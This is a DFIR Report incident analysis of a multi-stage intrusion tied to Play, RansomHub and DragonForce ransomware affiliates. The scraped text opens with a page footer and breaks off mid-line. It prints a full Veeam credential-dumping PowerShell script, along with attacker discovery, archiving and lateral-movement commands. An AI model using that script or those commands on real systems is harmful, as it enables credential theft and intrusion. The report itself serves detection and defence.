Write to Suspicious Folder Yara MALPEDIA_Win_Systembc_Auto DITEKSHEN_MALWARE_Win_EXEPWSH_Dlagent TELEKOM_SECURITY_Win_Systembc_20220311 EXT_MAL_SystemBC_Mar22_1 ELASTIC_Windows_Trojan_Systembc_C1B58C2F SUSP_XORed_URL_In_EXE DITEKSHEN_MALWARE_Win_Arechclient2 ELASTIC_Windows_Trojan_Redlinestealer_15Ee6903 ELASTIC_Windows_Generic_Threat_2Ae9B09E MITRE ATT&CK Additional Local or Domain Groups - T1098.007 Archive via Utility - T1560.001 Automated Collection - T1119 Create Account - T1136 Credentials from Password Stores - T1555 DCSync - T1003.006 Disable or Modify Tools - T1562.001 Domain Account - T1087.002 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Exfiltration Over Alternative Protocol - T1048 File and Directory Discovery - T1083 Group Policy Discovery - T1615 Lateral Tool Transfer - T1570 Local Account - T1087.001 Local Account - T1136.001 Local Groups - T1069.001 LSASS Memory - T1003.001 Malicious File - T1204.002 Masquerading - T1036 MSBuild - T1127.001 Network Service Discovery - T1046 Network Share Discovery - T1135 Obfuscated Files or Information - T1027 PowerShell - T1059.001 Protocol Tunneling - T1572 Proxy - T1090 Registry Run Keys / Startup Folder - T1547.001 Remote Desktop Protocol - T1021.001 Remote System Discovery - T1018 Service Execution - T1569.002 System Network Configuration Discovery - T1016 Timestomp - T1070.006 Web Protocols - T1071.001 Windows Command Shell - T1059.003 Windows Management Instrumentation - T1047 Windows Service - T1543.003 Internal Case #TB32034 #PR37389 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira From a Single Click: How Lunar Spider Enabled a Near Two-Month Intrusion Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts dragonforce play ransomhub sectoprat Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs September 8, 2025 Key Takeaways The intrusion began when a user downloaded and executed a malicious file impersonating DeskSoft\u2019s EarthTime application but instead dropped SectopRAT malware. The threat actor deployed multiple malware families, including SystemBC for proxy tunneling, and later Betruger backdoor for additional capabilities. They leveraged various tools such as AdFind, SharpHound, SoftPerfect NetScan, and GT_NET.exe (Grixba) to map out the environment and perform reconnaissance activities. Lateral movement was primarily accomplished through RDP connections, with additional use of Impacket\u2019s wmiexec. The threat actor moved across multiple systems, including domain controllers, backup servers, and file servers, while maintaining persistence through local account creation and startup folder shortcuts. Data collection and exfiltration were performed using WinRAR to compress targeted file shares containing sensitive business documents, which were then transferred via WinSCP to an FTP server hosted by a cloud provider in clear text. The discovery of Grixba (a reconnaissance tool linked to Play ransomware), a previous NetScan output containing data from a company reportedly compromised by DragonForce ransomware, and the use of the Betruger backdoor suggest that the likely objective of this intrusion was ransomware deployment. Based on these findings, the threat actor behind this intrusion was most likely an affiliate operating across multiple ransomware groups. This case was originally published as a Threat Brief to customers in March of 2025. Interested in pricing or have questions about our services? Contact us The DFIR Report Services Private Threat Briefs : 20+ private DFIR reports annually. Threat Feed : Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc. All Intel : Includes everything from Private Threat Briefs and Threat Feed, plus private events, Threat Actor Insights reports, long-term tracking, data clustering, and other curated intel. Private Sigma Ruleset : Features 170+ Sigma rules derived from 50+ cases, mapped to ATT&CK with test examples. DFIR Labs : Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds. Contact us today for pricing or a demo! Table of Contents: Case Summary Analysts Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Impact Timeline Diamond Model Indicators Detections MITRE ATT&CK Case Summary The intrusion began in September 2024 with a download of a malicious file mimicking the EarthTime application by DeskSoft. Upon execution, SectopRAT was deployed which opened a connection to its command and control (C2) infrastructure. The threat actor established persistence by relocating the malicious file and placing a shortcut in the Startup folder, configured to trigger on user logon. They further elevated access by creating a new local account and assigning it local administrative privileges. Soon after establishing the initial access, the malware deployed SystemBC. They then accessed the beachhead host via RDP using the newly created local account and executed discovery commands. At this stage, the threat actor completed a DCSync attack against a domain controller. They then followed up by connecting to the domain controller over RDP with the built-in Administrator account and used PsExec to execute SystemBC with SYSTEM privileges on the host. Using their existing proxy tunnel, the threat actor once again used RDP to connect to hosts in the environment. While on the domain controller, we observed the threat actor using Windows utilities, such as ipconfig and nltest, to perform an enumeration. Over the next few hours, the threat actor connected to several servers using RDP and deployed SystemBC across the environment. On a backup server, they executed a PowerShell script designed to retrieve Veeam credentials. On the second day, the threat actor used RDP to move laterally to the file server where they dropped a WinRAR executable and archived specific file shares. They transferred the resulting archives to a U.S. based cloud host over unencrypted FTP using WinSCP. This enabled the retrieval of credentials, among other details, during traffic analysis. The threat actor also resumed discovery activity with the use of Grixba, a tool associated with Play Ransomware that uses WMI and WinRM to discover users and systems across the network, which was executed from both the domain controller and a backup server. They carried out further discovery activity with the use of AdFind for AD queries, PowerShell Cmdlets to collect host data, SharpHound for directory mapping, and SoftPerfect NetScan to scan remote hosts. On the sixth day of the intrusion, SectopRAT spawned a new payload on the beachhead host. The new payload executed was Betruger, a multi-function backdoor. The threat actor also used wmiexec to enumerate remote hosts through various reconnaissance commands executed on the domain controller. Throughout the intrusion, the threat actor used multiple defense evasion techniques, including process injection, timestomping, disabling Microsoft Defender\u2019s protections, and deploying binaries with spoofed metadata to disguise themselves as legitimate cybersecurity tools such as SentinelOne and Avast Antivirus. While no final actions were observed during this intrusion before the threat actor was evicted, the evidence shows links to three different ransomware operations. The Grixba tooling has been associated with the Play ransomware group. Similarly the Betruger backdoor has been linked to Ransomhub affiliated threat actors. And finally with opsec failures, the threat actor dropped the results of prior netscan discovery that appeared to contain data from a company that had been posted to the DragonForce Ransomware leak site prior in 2024. With each of these indicators we assess this threat actor was active as an affiliate for multiple ransomware groups. Analysts Analysis and reporting completed by r3nzsec , EncapsulateJ , rkonicekr , and Adam Rowe . Initial Access The intrusion began when a user downloaded and executed an executable impersonating DeskSoft\u2019s EarthTime application. This binary initiated a chain of execution leading to the deployment of SecTopRat, a .NET-based remote access trojan (RAT) with information-stealing capabilities. While investigating the connection between this malware and the legitimate software, we identified a vulnerability in the installer. Although we did not observe the threat actor exploiting this flaw, it may explain why the software was targeted. The EarthTime application has a list of resource files that it will copy into its install location. This includes the EarthTime.exe executable file. When the installer is run, before it unpacks the resources from inside the installer package, It first looks for these resources in the current directory: Meaning that if any of the files listed in the resource are found, it will copy that file instead of the one packaged in the installer. For example, we created our own Cities.txt file, and on installation, we confirmed our modified file was copied to the installed location: This behavior matches CWE-427 \u2013 Uncontrolled Search Path Element ( https://cwe.mitre.org/data/definitions/427.html ) We discovered that this vulnerability applies to all software provided by Desksoft. Execution EarthTime.exe The EarthTime.exe binary was executed from the Downloads folder. The parent process was explorer.exe, suggesting it was executed by the victim clicking on the executable. EarthTime.exe appeared to be mimicking the legitimate EarthTime application by DeskSoft. The real EarthTime is a world clock utility that lets users track multiple time zones and view astronomical data like sunrise and sunset times for different locations. It\u2019s particularly useful for business users and travelers who need to coordinate across time zones. This malicious version had been signed with a revoked certificate from \u201cBrave Pragmatic Network Technology Co., Ltd.\u201d \u2013 likely an attempt to make it look legitimate to both users and security software. Brave Pragmatic Network Technology Co., Ltd. appears to be a compromised or fraudulent certificate authority that has been observed signing multiple malware samples, with security researchers tracking various malicious executables bearing certificates from this entity. According to Cert Central lookup database , Brave Pragmatic Network Technology Co., Ltd. is a known malicious signer that has been observed signing SectopRAT samples, with certificates issued by GlobalSign GCC R45 EV CodeSigning CA 2020 and traced to China (CN). The choice to impersonate EarthTime makes sense from the threat actor\u2019s perspective, as people are generally more willing to run software they recognize. A file named \u201cEarthTime.exe\u201d is far less suspicious than something with a random or obviously malicious name, making this a classic example of social engineering through software masquerading. At the time of writing, the binary is widely recognized as malicious : EarthTime.exe spawned cmd.exe with no command line arguments. This cmd.exe process went on to spawn MSBuild.exe with the CurrentDirectory set to the user\u2019s downloads folder. MSBuild.exe is a legitimate binary signed by Microsoft, but it is unusual for it to be executed with no command-line arguments. Red Canary has previously observed this activity linked to the SecTopRAT/ArechClient2, a .NET RAT tool, which also inspired the following threat hunting query , which would detect this activity. Process chains where SecTopRat/ArechClient2 has been injected into both cmd.exe and a subsequent msbuild.exe child process have been commonly observed, such as by Red Canary and The DFIR Report . After injection, the malicious MSBuild.exe process reached out to Pastebin to retrieve its C2 configuration. MSBuild.exe communicated with 45.141.87.55 on ports 9000 and 15647. This traffic triggered the following Suricata rules: This SectopRAT IP address was also mentioned by Fox_threatintel on X/Twitter last year (2024) while also mentioning port 9000 The same IP address was listed in the IOC section of RussianPanda\u2019s blog detailing The abuse of ITarian RMM by the Dolphin Loader, a malware delivery mechanism that leverages legitimate remote management tools to deploy RATs like SectopRAT. This MSBuild.exe process then wrote the malicious executable C:\\Users\\Public\\Music\\WakeWordEngine.dll . This file write event triggered the following Sigma rules: \u2022 \u2018Suspicious Binaries and Scripts in Public Folder\u2019 \u2022 \u2018Windows Shell/Scripting Application File Write to Suspicious Folder\u2019 WakeWordEngine.dll | conhost.dll WakeWordEngine.dll is widely recognized as malicious at the time of writing. VirusTotal recognizes the file as conhost.dll : In-memory YARA scans identified the DLL as SystemBC, triggering the following signatures: Rule: ELASTIC_Windows_Trojan_Systembc_C1B58C2F Rule: EXT_MAL_SystemBC_Mar22_1 Rule: MALPEDIA_Win_Systembc_Auto Rule: TELEKOM_SECURITY_Win_Systembc_20220311 This DLL was deployed across multiple compromised servers throughout the intrusion. In most instances, it retained the same filename observed on the initial beachhead system (WakeWordEngine.dll); however, on the domain controller it was renamed to conhost.dll which corresponds to the filename identified in VirusTotal analysis. Across all infected systems, the malware was consistently staged in the C:\\Users\\Public\\Music\\ directory and executed via rundll32.exe, calling the exported function \u2018Reset\u2019. For instance, we also observe the threat actor executing the malicious DLL remotely via PsExec. WakeWordEngine.dll/conhost.dll processes were observed communicating with 149.28.101.219 over port 443. OSINT data identifies this IP address as associated with SystemBC infrastructure and shows it resolves to the following domains: Memory analysis found that once loaded in memory, the strings within the DLL show multiple items of interest, including the configured C2 IP and port, a user-agent, as well as references to PowerShell and ntdll.dll\u2019s LdrLoadDll function, which can be used for DLL loading: The full initial access and execution chain is captured below: ccs.exe On day six, MSBuild.exe wrote C:\\Users\\Public\\Music\\ccs.exe to disk. The ccs.exe binary was subsequently executed with MSBuild.exe as the parent process. Exiftool analysis revealed that the binary contained the following metadata, designed to impersonate Avast Antivirus: At the time of writing, ccs.exe is widely recognized as malicious in VirusTotal and was identified as Betruger backdoor by Symantec, a tool commonly used by RansomHub affiliates. According to Symantec\u2019s analysis , the Betruger backdoor incorporates functionality typically found across multiple pre-ransomware tools, consolidating various attack capabilities into a single executable. Betruger\u2019s comprehensive feature set includes screenshotting, keylogging, file exfiltration, network reconnaissance, privilege escalation, and credential harvesting. This extensive functionality suggests that Betruger was explicitly developed to streamline ransomware operations by reducing the number of distinct tools that need to be deployed on a compromised network during the preparation phase of an attack. Once executed, ccs.exe then injected itself into the memory of 172 distinct running processes. The call trace logged in Sysmon Process Access events shows ccs.exe injecting itself into these processes\u2019 memory: vhd.dll Lastly, we also observed another execution of a suspicious DLL (vhd.dll) dropped on the disk in the same staging folder of the threat actor. The threat actor used this PowerShell command to set the working directory to C:\\Users\\Public\\Music , a publicly writable folder where they had staged their malicious payloads. This allowed them to later execute VHD.dll via rundll32.exe without specifying a full path, simplifying execution and reducing the visibility of suspicious file paths in command-line logs. Upon execution, the vhd.dll would ask for a key, which is needed in order to fully execute the program. While checking the codes, we observed vhd.dll is a loader that asks for a key to decrypt a local file ( data.dat ) containing a hidden payload. Once decrypted, it executes the payload to ensure it only runs if the correct key is provided. Unfortunately, we were unable to fully attribute or deeply analyze the .DAT file to determine its specific purpose or associated malware family. Persistence Following the execution of the malicious binary EarthTime.exe, the threat actor leveraged the Windows Background Intelligent Transfer Service (BITS) to establish persistence through two coordinated activities. The first transfer involved copying the original executable to a new location at C:\\Users\\<REDACTED>\\AppData\\Roaming\\QuickAgent2\\ and renaming it to ChromeAlt_dbg.exe , likely to masquerade as a legitimate Chrome debugging utility. The second transfer created a shortcut file ChromeAlt_dbg.lnk and placed it in the C:\\Users\\<REDACTED>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory. Through the creation of this startup entry, the threat actor successfully established a persistence mechanism with ChromeAlt_dbg.lnk setup to execute the renamed Earthtime.exe file, ChromeAlt_dbg.exe . During the intrusion, the threat actor created a local account named \u201cAdmon\u201d with the password \u201cQwerty12345!\u201d using the legitimate binary net.exe on the beachhead host. Privilege Escalation The threat actor created a new local user account called \u201c Admon \u201d with the password \u201c Qwerty12345 !\u201d on the compromised system. They then added this newly created account to the local Administrators group, giving themselves full administrative privileges on the machine. The threat actors leveraged Microsoft Sysinternals\u2019 PsExec utility for local privilege escalation on the compromised host. By utilizing the \u201c-s\u201d parameter, the adversaries were able to execute malicious binaries with SYSTEM-level privileges, effectively escalating from their initial user-level access to the highest administrative privileges on the Windows system. Defense Evasion During the initial access malware execution a SectopRAT binary was written to %AppData%\\Local\\Temp as bhnwcwgaphpge. This was then injected into the MSBuild.exe process to run the malware. Two of the binaries observed in this attack were masquerading as products from well-known and reputable security vendors. The first binary, GT_NET.exe is associated with Grixba, a custom data-gathering tool used by the Play ransomware group. Its metadata was crafted to impersonate SentinelOne security software, complete with fake product names, descriptions, and copyright information referencing \u201cSentinel Labs, Inc.\u201d The team from Field Effect also noticed this, as per their blog back in January of this year. The second binary, ccs.exe contains the Betruger backdoor commonly deployed by RansomHub affiliates. This malware was designed with extensive metadata mimicking Avast Antivirus, including legitimate-appearing product names, version numbers, and copyright information. The threat actors even used a filename convention (\u201caswAvBootTimeScanShMin.exe\u201d) that closely resembles authentic Avast components. We also observed the threat actor attempting to disable Windows Defender\u2019s security features by modifying critical registry keys on the domain controller and backup server. Examining the registry events reveals a step-by-step approach to disable multiple Windows Defender registry keys, including real-time scanning, behavior monitoring, anti-spyware detection, and network protection. These registry changes focused on the Windows Defender policy area ( HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\ ), showing the threat actor wanted to make system-wide security changes that would last through reboots and affect all users. By targeting the policy registry instead of user-specific settings, the threat actor made sure they had maximum impact while keeping their changes in place during their attack. Lastly, the theater actor performed potentially time-stomping activities by manipulating the metadata of the ExportData.db file, which contained the scan results, by executing the \u201cGT_NET.exe\u201d binary. This timestomping occurred immediately after GT_NET.exe created the ExportData.db file, which suggests the threat actor attempts to cover its tracks by automatically changing the timestamps of its created files. The choice of a future date (2037) is particularly telling \u2013 it\u2019s far enough from the actual attack time frame to potentially throw off forensic analysis that relies on file timestamps to understand the sequence of events. Below is the sequence of events by looking at Sysmon Event ID 2. Credential Access The threat actor employed various methods to access credentials throughout this intrusion, including information stealers, Veeam database credential dumping, DCSync attacks, and the deployment of Betruger backdoor malware. Information Stealers YARA scans on memory dumps from the beachhead returned various hits for Arechclient malware (aka SectopRAT) with the following signature: Windows.Trojan.Arechclient2 SectopRAT is widely known to have information-stealing capabilities, which are on display in the strings from this particular dump. The strings reference scans for various services, including Steam, Discord, Telegram, web browsers, and crypto wallets, which is textbook infostealer activity. Veeam Database Credential Dumping Windows Event ID 4104 from the Microsoft-Windows-PowerShell/Operational log is generated by PowerShell\u2019s script block logging feature, which records the execution of PowerShell scripts. This artifact revealed that the threat actor executed a script on the backup server to extract credentials from a Veeam database. The script contains multiple sections, which have been broken down into smaller parts for better readability. The first section queries the Windows Registry for SQL Server instances and targets a hardcoded database named \u201cVeeamBackup\u201d. The $SQLQuery variable was configured to retrieve the top 1000 rows from the Credentials table within the VeeamBackup database: \"# SQL Server and database\\\\\" $hostname = hostname \"$SQLInstances = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server').InstalledInstances\" \"$SQLServer = \\\"$hostname\\\\$SQLInstances\\\" #use Server\\\\Instance for named SQL instances! \" \"$SQLDBName = \\\"VeeamBackup\\\"\" \"# SQL Query\" \"$SqlQuery = \\\"SELECT TOPdatabase (1000) [id],[user_name],[password],[usn],[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials]\\\"\" The next section of the script establishes a connection to the SQL Server database, executes the query stored in the $SQLQuery variable, stores the results in a dataset, and then closes the connection: \"# Connection string \" $SqlConnection = New-Object System.Data.SqlClient.SqlConnection \"$SqlConnection.ConnectionString = \\\"Server = $SQLServer; Database = $SQLDBName; Integrated Security = True\\\" $SqlCmd = New-Object System.Data.SqlClient.SqlCommand $SqlCmd.CommandText = $SqlQuery $SqlCmd.Connection = $SqlConnection $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter $SqlAdapter.SelectCommand = $SqlCmd $Result= New-Object System.Data.DataSet $SqlAdapter.Fill($Result) \"#Close the connection \" $SqlConnection.Close() The next section of the script was used to convert DataTable rows to PowerShell objects: $MyArray = ForEach ($Row in $Result.Tables[0].Rows) { $Record = New-Object PSObject ForEach ($Col in $Result.Tables[0].Columns.ColumnName) { Add-Member -InputObject $Record -NotePropertyName $Col -NotePropertyValue $Row.$Col } $Record } The final section of the script contains a for loop that performs the following actions: Iterates through each item in the $MyArray variable Loads the DLL Veeam.Backup.Common.dll (required to access the class needed for password decryption) Uses Veeam\u2019s ProtectedStorage class to decrypt the encoded passwords Displays usernames, decrypted passwords, and descriptions to the console for ($i = 0; $i -lt $MyArray.Length; $i++) { Add-Type -Path \"C:\\Program Files\\Veeam\\Backup and Replication\\Backup Catalog\\Veeam.Backup.Common.dll\" $encoded = $MyArray.password[$i] $pass = [Veeam.Backup.Common.ProtectedStorage]::GetLocalString($encoded) Write-Host \"==================\" Write-Host \"user_name: \" $MyArray.user_name[$i] Write-Host \"password: \" $pass Write-Host \"description:\" $MyArray.description[$i] Write-Host \"==================\" DCSync Credentials were also dumped via a DCSync attack using a privileged account. The activity was observed in Windows Security Event ID 4662, with clear indicators including a non-computer-based account, an access mask of 0x100, and the following object ID: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} = DS-Replication-Get-Changes Betruger Backdoor As outlined in the Command and Control section of this report, the file hash for the executable C:\\Users\\Public\\Music\\ccs.exe returned a direct match for the Betruger backdoor. According to research conducted by the Symantec team, this backdoor is multifunctional and includes modules designed for credential dumping. The backdoor accessed the LSASS process memory to harvest credentials, which was observed through a Sysmon process access event showing a GrantedAccess value of 0x1410 . Discovery Local system discovery The initial execution of MSBuild.exe on the beachhead led to the discovery of commands such as ipconfig , nslookup and net localgroup . Below is the illustration of the execution chain involving multiple Windows built-in commands abused by the threat actor. On day six of the intrusion, additional discovery and reconnaissance commands were executed on the compromised beachhead host. These commands were spawned as child processes of the Betruger ccs.exe process and included whoami for identity verification, net user and net group for local and domain user enumeration, nltest for domain trust relationship analysis, and ping for network connectivity testing. The cmd.exe process spawned by Betruger also wrote several suspicious hidden files indicative of discovery in the user\u2019s Downloads directory, which was also the CurrentDirectory: Network Scanning During the intrusion, the threat actor two versions of the Grixba tool. Grixba is a custom tool reportedly used by Play Ransomware that scans computer networks to find users, computers, and installed software using built-in Windows tools like WMI and WinRM. It specifically looks for security programs, antivirus software, backup tools, and office applications for reconnaissance purposes. An analysis of a Grixba sample revealed the following help message and functionality: During day two of the intrusion, the threat actor deployed the Grixba reconnaissance tool ( GT_NET.exe ) on the compromised backup server. The malware was executed through a cmd.exe parent process using the command line. GT_NET.exe -m:scan -i:f -d:list.txt Here\u2019s the command line options breakdown: -m:scan - Sets the mode/method to scan. -i:f - Input parameters set to \"f\" (file) -d:list.txt - Destination parameter pointing to list.txt. Can be used to load target IPs. GT_NET.exe generated 3,861 internal DNS queries and established 186 network connections during its execution. The majority of connections targeted destination port 135 (Microsoft RPC), with additional connections to port 389 (LDAP) and various high-numbered ephemeral ports ranging from 49666 to 63964. The creation of data.zip and ExportData.db files align with behavioral indicators documented by Field Effect\u2019s research on Grixba malware in their published analysis. Another network scanning tool used was the SoftPerfect tool netscan.exe, which was executed on the domain controller from the path C:\\Users\\Public\\Music\\123\\123\\netscan.exe and scanned ports 135 (RPC), 445 (SMB) and 3389 (RDP) across 46 IP addresses. During the netscan execution on the domain controller, we observed the creation of a file called delete.me on the C$ share of the beachhead workstation, logged by Event ID 5145. This activity has been previously observed related to netscan.exe when the \u2018Check for write access\u2019 option is enabled, as detailed in previous reports: https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware and https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours Prior to the execution of netscan.exe, we also observed the threat actors creating netscan.xml in the same directory as the executable. This file was retrieved for analysis, and inspecting its contents shows the checkwrite flag was indeed enabled: Digging into the netscan.xml config file, it\u2019s clear that the threat actors tweaked it to suit their needs, with a big focus on using PsExec to run scripts remotely. This setup enables them to deploy batch files, such as newuser.bat, openrdp.bat, and start.bat across the network. This opens the door to tasks like setting up new user accounts, enabling RDP access, and deploying additional malicious payloads. While examining the files associated with NetScan, we observed one output file with a filename matching the name of a company, potentially indicating a victim of this threat actor. Based on OSINT data, this organization has been compromised by DragonForce, as evidenced by their company profile being posted on DragonForce\u2019s data leak site (DLS). The third and final tool used for network scanning was GRB_NET.exe (another version of Grixba). This was executed on the domain controller from two different paths using different command line arguments: Upon execution, GRB_NET.exe initiated extensive network reconnaissance by generating 1,373 DNS A record queries to enumerate internal domain hosts and establishing 145 network connections. These connections primarily targeted port 135 (Microsoft RPC) and port 389 (LDAP) for service enumeration, along with ephemeral ports in the range 49666-51508. Following the reconnaissance phase, the malware created an archive file C:\\Users\\Public\\Music\\export.zip likely containing the collected data. GRB_NET.exe is unsigned and recognized as malicious by 10 vendors in VirusTotal. Active Directory Discovery On day two of the intrusion, the threat actors executed SharpHound (disguised as sh.exe ) on the domain controller from the directory C:\\PerfLogs\\ . This Active Directory reconnaissance tool was launched with the command line parameters shown below. Binary analysis confirmed the executable\u2019s metadata identifies it as a renamed SharpHound binary, which also indicates evasion tactics. When executed, sh.exe made 1,271 internal DNS A requests, as well as the following network connections, all of which triggered the Sigma rule \u2018Network Connection Initiated From Process Located In Potentially Suspicious Or Uncommon Location\u2019: sh.exe also wrote the following files, indicative of BloodHound/SharpHound execution. The writing of these files triggered the following Sigma rules: \u2018BloodHound Collection Files\u2019 \u2018Suspicious File Created in PerfLogs\u2019 \u2018Windows Shell/Scripting Application File Write to Suspicious Folder\u2019 The threat actor conducted additional Active Directory reconnaissance using the ADFind enumeration tool ( Adfind.exe ), which was staged in the C:\\Users\\Public\\Music\\ directory. The threat actor executed the command with the \u201c-subnets\u201d parameter to query the CN=Subnets,CN=Sites,CN=Configuration partition, where Active Directory stores subnet-to-site mappings and network topology information. PowerShell Script Block logging from the Domain Controller (event code 4104) shows the following Get-ADComputer command was imported and then executed to enumerate Active Directory computer objects and output them to a CSV file: Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select comment, description, Name, DNSHostName, OperatingSystem, LastLogonDate, ipv4address | Export-CSV C:\\Users\\Public\\Music\\AllWindows.csv -NoTypeInformation -Encoding UTF8 Other discovery commands executed on the Domain Controller and observed in the PowerShell Script Block logging include: nltest /domain_trusts /all_trusts nltest /dclist: net group \"Domain Admins\" /domain File Discovery Prior to the archiving stage, we observed the threat actor accessing the contents of multiple files using wordpad.exe , primarily on the file server as part of their discovery phase. On two occasions, the threat actor pivoted to the backup server to view and access files on the shared drives. This demonstrates the lateral movement capabilities and network discovery, which indicates the threat actor had gained extensive knowledge of the organization\u2019s infrastructure and understood how to navigate between systems to access sensitive data efficiently. One notable document sought out and opened by the threat actor was an insurance policy document covering cyber intrusions. Where zipped files were found, these were opened using WinRAR: \"C:\\Program Files\\WinRAR\\WinRAR.exe\" x -iext -ow -ver -imon1 \u2013 \"F:\\Shares\\<redacted>\\<redacted>\\<redacted>.zip\" F:\\Shares\\<redacted>\\<redacted>\\<redacted>\\ Lateral Movement The Remote Desktop Protocol (RDP) and Impacket\u2019s wmiexec were used throughout this intrusion to facilitate lateral movement. Remote Desktop Protocol The adversary primarily relied on Remote Desktop Protocol (RDP) for lateral movement throughout the compromised network. Analysis of Windows security logs revealed a consistent pattern where logon type 3 (network) events were immediately followed by logon type 10 (remote interactive) events, which is characteristic of RDP authentication sequences. This specific logon pattern was likely facilitated by SystemBC malware\u2019s proxy capabilities, which enabled the threat actor to establish RDP connections through compromised systems. Notably, the Windows security event logs disclosed the host names of the threat actor\u2019s workstations: (note the apparent typo in \u201cDESCTOP\u201d in one instance). DESCTOP-QPITRY DESKTOP-A1HRTMJ DESKTOP-PGD76HT WIN-FLGU1CC210K Impacket On day six, the threat actor used wmiexec from the Impacket suite to remotely execute various enumeration commands on the domain controller. The parent-child relationship between WmiPrvSE.exe and cmd.exe, combined with the characteristic output redirection to administrative shares, provides a clear signature of wmiexec usage. The commands executed behave as typical post-exploitation reconnaissance activities, with particular focus on enumerating specific user accounts and understanding the current user session. Betruger After the deployment of the Betruger backdoor on day six, multiple Windows Event IDs 4776 (credential validation) were observed, indicating successful network authentication attempts against the beachhead system. The source workstation associated with these authentication events WIN-FLGU1CC210K had not been observed in any previous activity during this intrusion. Based on the timing correlation with Betruger deployment and the sudden appearance of this previously unseen hostname, we assess with high confidence that this represents an additional workstation under threat actor control. Collection WinRAR.exe was brought into the victim environment for collection purposes. On day two, during a period of the threat actor\u2019s activity and under a compromised user context, explorer.exe created C:\\Users\\Public\\Music\\winrar-x64-611.exe . This binary was then executed and wrote the file C:\\Program Files\\WinRAR\\WinRAR.exe to disk. The threat actor then used WinRAR.exe to zip victim files on the file share prior to exfiltration. They systematically archived six high-value directories, before performing additional archiving operations on specific files, e.g. \"C:\\Program Files\\WinRAR\\WinRAR.exe\" a -ep1 -scul -r0 -iext -imon1 -- . F:\\Shares\\REDACTED\\REDACTED The threat actor also deployed a tool named FS64.exe , a custom tool designed for automating file collection. During execution, the threat actor specifies the drive or directory from which to collect files, and the tool outputs a .txt file containing the list of collected files. It was executed on the backup server, targeting a remotely mounted share on the file server. The process wrote the file __<redacted_fileserver_ip>_F$_Shares.txt as well as copying multiple .xls, .xlsx, .doc., .docx, .pdf files to the C:\\Users\\Public\\Music\\ directory. Winrar.exe was also used to extract WinSCP.rar in preparation for exfiltration. We also discovered a WinSCP.ini configuration file used by the WinSCP application. The threat actor utilized WinSCP to perform data exfiltration, as detailed in the Exfiltration section of this report. This WinSCP configuration reveals that the threat actor configured a custom file mask targeting a wide range of file types, including web content ( .html , .php , .js , .css ), configuration files ( .cfg , .ini , .htaccess ), and scripts/source code ( .sh , .pl , .c , .cpp ). This selective file mask indicates an intent to specifically identify and exfiltrate files containing website content, credentials, or source code rather than indiscriminately copying all available files. Command and Control Three separate Command and Control channels were observed: SectopRAT, SystemBC, and Betruger. SectopRAT The following Surricata rules triggered on the network traffic, once SectopRAT injected itself into the MSBuild.exe process for IP address 45.141.87[.]55. This IP was tracked by the DFIR Report Threat Intelligence Group as an active SectopRAT C2 server from August 8th 2024 through November 23rd 2024. The rule \u201c ET MALWARE Arechclient2 Backdoor/SecTopRAT CnC Init \u201d fired when network traffic to the destination port 15647 was detected. Initiated: true \u00a6 Proto: tcp \u00a6 SrcIP: 10.X.X.X \u00a6 TgtIP: 45.141.87[.]55 \u00a6 TgtPort: 15647 \u00a6 Proc: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe The second rule \u201c ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity M2 (GET) (SID 2052248) \u201d fired when C2 beaconing activity to destination port 9000 was observed. Initiated: true \u00a6 Proto: tcp \u00a6 SrcIP: 10.X.X.X \u00a6 TgtIP: 45.141.87[.]55 \u00a6 TgtPort: 9000 \u00a6 Proc: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe SystemBC Shortly after the command-and-control (C2) channel was established via the SectopRAT malware, a new file named WakeWordEngine.dll (also observed later in the intrusion named conhost.dll) was created on the beachhead host. This file was identified as the SystemBC tool, which is commonly leveraged for its proxying and tunneling capabilities. The threat actor used SystemBC to establish a tunnel, enabling Remote Desktop Protocol (RDP) access via proxy connections. This allowed them to pivot into the internal network from external systems, facilitating further post-compromise activity within the environment. The following Sigma rule triggered once the tunnel was established \u201cOutbound RDP Connections Over Non-Standard Tools\u201d. Initiated: true \u00a6 Proto: tcp \u00a6 SrcIP: 10.X.X.X \u00a6 SrcPort: 62105 \u00a6 TgtIP: 10.65.45[.]223 \u00a6 TgtPort: 3389 \u00a6 Proc: 